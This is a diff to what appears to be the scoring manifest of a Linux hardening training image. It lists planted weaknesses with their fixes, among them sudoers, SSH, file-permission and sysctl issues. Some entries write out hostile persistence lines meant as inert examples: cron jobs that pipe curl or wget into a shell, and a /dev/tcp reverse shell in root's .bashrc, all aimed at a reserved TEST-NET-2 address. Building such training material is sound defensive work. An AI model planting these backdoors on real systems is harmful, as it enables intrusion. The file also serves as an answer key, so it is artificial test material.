@@ -30,6 +30,38 @@ vulnerabilities:
     plantedAs: "User `mallory` added to the sudo group."
     remediation: "Remove mallory from sudo (deluser mallory sudo)."
 
+  - checkId: svc-backup-account
+    category: accounts
+    skillNode: linux.accounts.passwd-shadow
+    points: 10
+    title: "Unauthorized service-looking account with an interactive shell"
+    plantedAs: "User `svc-backup` created with uid 1003 and /bin/bash — looks like a service account but has a real login shell and is not README-authorized."
+    remediation: "Delete the account (userdel -f svc-backup)."
+
+  - checkId: sudo-nopasswd
+    category: accounts
+    skillNode: linux.accounts.sudoers
+    points: 10
+    title: "Passwordless root granted via sudoers NOPASSWD"
+    plantedAs: "/etc/sudoers.d/99-devops grants the authorized user zzsync `NOPASSWD:ALL` — the account is allowed, the NOPASSWD is the vuln."
+    remediation: "Remove the NOPASSWD drop-in, or edit it to drop NOPASSWD (visudo -f /etc/sudoers.d/99-devops)."
+
+  - checkId: empty-password
+    category: accounts
+    skillNode: linux.accounts.passwd-shadow
+    points: 12
+    title: "Account with a blank password field"
+    plantedAs: "zzsync's /etc/shadow password field was cleared (passwd -d zzsync) — anyone can log in with no password."
+    remediation: "Set a real password or lock the account (usermod -p '!' zzsync)."
+
+  - checkId: chage-maxdays
+    category: accounts
+    skillNode: linux.accounts.chage
+    points: 8
+    title: "Password max-age left at the insecure default"
+    plantedAs: "/etc/login.defs ships PASS_MAX_DAYS 99999 — passwords never expire."
+    remediation: "Set PASS_MAX_DAYS to 365 or less (we recommend 90) in /etc/login.defs."
+
   - checkId: pwquality-minlen
     category: pam
     skillNode: linux.pam.pwquality
@@ -46,6 +78,22 @@ vulnerabilities:
     plantedAs: "/etc/security/faillock.conf shipped with every directive commented out."
     remediation: "Set deny >= 1 (we recommend 5) in faillock.conf."
 
+  - checkId: pwquality-credits
+    category: pam
+    skillNode: linux.pam.pwquality
+    points: 10
+    title: "No password character-class (credit) requirements"
+    plantedAs: "pwquality.conf's dcredit/ucredit/ocredit/lcredit are all absent — same unconfigured file as pwquality-minlen."
+    remediation: "Set dcredit = -1, ucredit = -1, ocredit = -1, lcredit = -1 in pwquality.conf (the same edit that fixes pwquality-minlen also satisfies this)."
+
+  - checkId: pwhistory-remember
+    category: pam
+    skillNode: linux.pam.pwhistory
+    points: 8
+    title: "No password-reuse prevention configured"
+    plantedAs: "/etc/security/pwhistory.conf shipped with remember= commented out, and common-password has no explicit pam_pwhistory.so remember= either."
+    remediation: "Set remember = 5 in pwhistory.conf, OR add remember=5 to the pam_pwhistory.so line in /etc/pam.d/common-password — either location is credited."
+
   - checkId: ssh-permitrootlogin
     category: ssh
     skillNode: linux.ssh.permitrootlogin
@@ -61,6 +109,26 @@ vulnerabilities:
       credits whichever file actually wins.
     remediation: "Set PermitRootLogin no in the file that wins — here, the 50-cloud-init.conf drop-in."
 
+  - checkId: ssh-maxauthtries
+    category: ssh
+    skillNode: linux.ssh.limits
+    points: 8
+    title: "SSH MaxAuthTries left high"
+    plantedAs: >-
+      A new drop-in, /etc/ssh/sshd_config.d/60-devops-limits.conf, sets
+      MaxAuthTries 6 — loaded before the rest of the main file (same
+      Include-order trap as ssh-permitrootlogin), so editing only the main
+      sshd_config does nothing. Checked via merged config (sshd -T).
+    remediation: "Set MaxAuthTries 4 in the file that wins — here, 60-devops-limits.conf."
+
+  - checkId: ssh-x11forwarding
+    category: ssh
+    skillNode: linux.ssh.limits
+    points: 8
+    title: "SSH X11Forwarding left enabled"
+    plantedAs: "Same 60-devops-limits.conf drop-in sets X11Forwarding yes."
+    remediation: "Set X11Forwarding no in the file that wins — here, 60-devops-limits.conf."
+
   - checkId: cron-malicious
     category: services-persistence
     skillNode: linux.services-persistence.cron
@@ -69,6 +137,30 @@ vulnerabilities:
     plantedAs: "/etc/cron.d/pkg-update runs `curl ... | bash` against a TEST-NET-2 (RFC 5737) address every 5 minutes — inert, pattern-only."
     remediation: "Remove /etc/cron.d/pkg-update."
 
+  - checkId: cron-user-payload
+    category: services-persistence
+    skillNode: linux.services-persistence.cron
+    points: 10
+    title: "Malicious job in the authorized user's own crontab"
+    plantedAs: "/var/spool/cron/crontabs/zzsync runs `wget -qO- ... | sh` every 10 minutes against a TEST-NET-2 (RFC 5737) address — inert, pattern-only. Distinct location from the existing /etc/cron.d job."
+    remediation: "Remove the user crontab (crontab -r -u zzsync)."
+
+  - checkId: bashrc-payload
+    category: services-persistence
+    skillNode: linux.services-persistence.rc-bashrc
+    points: 8
+    title: "Reverse-shell payload in root's .bashrc"
+    plantedAs: "A `bash -i >& /dev/tcp/198.51.100.23/4444 0>&1` line appended to /root/.bashrc — classic persistence, TEST-NET-2 address."
+    remediation: "Remove the offending line from /root/.bashrc."
+
+  - checkId: rogue-authorized-key
+    category: services-persistence
+    skillNode: linux.services-persistence.authorized-keys
+    points: 10
+    title: "Rogue key in root's authorized_keys"
+    plantedAs: "/root/.ssh/authorized_keys contains a key the README doesn't authorize — a backdoor that survives a password change."
+    remediation: "Remove the key (or the whole file)."
+
   - checkId: insecure-service-absent
     category: services-persistence
     skillNode: linux.services-persistence.malware
@@ -76,6 +168,22 @@ vulnerabilities:
     title: "Prohibited telnet service installed"
     plantedAs: "telnetd installed via apt."
     remediation: "apt-get purge -y telnetd."
+
+  - checkId: insecure-service-vsftpd
+    category: services-persistence
+    skillNode: linux.services-persistence.malware
+    points: 10
+    title: "Prohibited vsftpd service installed"
+    plantedAs: "vsftpd installed via apt — a second 'prohibited service' proving the pattern generalizes beyond telnet."
+    remediation: "apt-get purge -y vsftpd."
+
+  - checkId: rpcbind-disabled
+    category: services-persistence
+    skillNode: linux.services-persistence.systemd-audit
+    points: 8
+    title: "Unneeded rpcbind service enabled"
+    plantedAs: "rpcbind installed and enabled by its own postinst — not required by the README."
+    remediation: "systemctl disable rpcbind.service (or purge the package)."
 
   - checkId: shadow-mode
     category: file-permissions
@@ -93,6 +201,38 @@ vulnerabilities:
     plantedAs: "/usr/local/bin/rootbash — a copy of /bin/bash with mode 4755."
     remediation: "Remove /usr/local/bin/rootbash."
 
+  - checkId: passwd-writable
+    category: file-permissions
+    skillNode: linux.files-perms.sensitive-modes
+    points: 8
+    title: "World-writable /etc/passwd"
+    plantedAs: "/etc/passwd mode set to 0666 — trivial account injection."
+    remediation: "chmod 644 /etc/passwd."
+
+  - checkId: sudoers-mode
+    category: file-permissions
+    skillNode: linux.files-perms.sensitive-modes
+    points: 8
+    title: "/etc/sudoers permissions loosened"
+    plantedAs: "/etc/sudoers mode set to 0777 (should be 0440)."
+    remediation: "chmod 440 /etc/sudoers."
+
+  - checkId: world-writable-dir
+    category: file-permissions
+    skillNode: linux.files-perms.world-writable
+    points: 8
+    title: "World-writable directory without a sticky bit"
+    plantedAs: "/opt/shared created with mode 0777 and no sticky bit — anyone can replace anyone else's files in it."
+    remediation: "chmod 0755 /opt/shared, or add the sticky bit (chmod +t)."
+
+  - checkId: second-suid
+    category: file-permissions
+    skillNode: linux.files-perms.suid
+    points: 8
+    title: "Second rogue SUID binary"
+    plantedAs: "/usr/local/bin/qfind — a copy of /usr/bin/find with mode 4755 (a GTFOBins privesc). Distinct from the existing rogue-suid finding, proving the check handles multiple planted binaries."
+    remediation: "chmod u-s /usr/local/bin/qfind, or remove it."
+
   - checkId: ufw-active
     category: updates-network
     skillNode: linux.updates-network.ufw
@@ -100,6 +240,35 @@ vulnerabilities:
     title: "Firewall disabled"
     plantedAs: "ufw installed but left in its default inactive state."
     remediation: "ufw enable (after confirming SSH access is allowed)."
+
+  - checkId: sysctl-ip-forward
+    category: updates-network
+    skillNode: linux.updates-network.sysctl
+    points: 8
+    title: "No sysctl hardening: IP forwarding"
+    plantedAs: "/etc/sysctl.d/99-roundzero.conf is absent, so net.ipv4.ip_forward is never hardened to 0 in a written config. Checked via the file, never live sysctl (Docker owns net.* on the host)."
+    remediation: "Create /etc/sysctl.d/99-roundzero.conf with net.ipv4.ip_forward = 0."
+
+  - checkId: sysctl-rp-filter
+    category: updates-network
+    skillNode: linux.updates-network.sysctl
+    points: 8
+    title: "No sysctl hardening: reverse-path filtering"
+    plantedAs: "Same missing sysctl file — net.ipv4.conf.all.rp_filter never set to 1."
+    remediation: "Add net.ipv4.conf.all.rp_filter = 1 to 99-roundzero.conf."
+
+  - checkId: sysctl-accept-redirects
+    category: updates-network
+    skillNode: linux.updates-network.sysctl
+    points: 8
+    title: "No sysctl hardening: ICMP redirects"
+    plantedAs: "Same missing sysctl file — net.ipv4.conf.all.accept_redirects never set to 0."
+    remediation: >-
+      Add net.ipv4.conf.all.accept_redirects = 0 to 99-roundzero.conf. These
+      three sysctl items target the SAME file, so fixing them is "write the
+      hardening config" — writing only one line credits only that check
+      (no partial credit on the others), which scripts/prove.sh's half-fixed
+      state proves explicitly.
 
 authorized:
   - checkId: decoy-authorized-user
@@ -120,3 +289,13 @@ authorized:
       scan. Checked as ssh.socket, not ssh.service: Ubuntu 24.04 ships SSH
       socket-activated, so ssh.socket is the unit actually enabled by
       default (multi-user.target.wants never gets an ssh.service symlink).
+
+  - checkId: decoy-required-cron
+    skillNode: linux.services-persistence.cron
+    title: "The nightly backup cron job is required — do not remove"
+    note: >-
+      /etc/cron.d/backup runs the README-required /usr/local/bin/backup.sh
+      nightly — legitimate, zero points. Keeps the authorization-model
+      lesson strong as the image grows: an over-zealous cron cleanup that
+      deletes this fails the decoy, teaching "don't remove authorized jobs"
+      alongside the existing user- and service-authorization decoys.
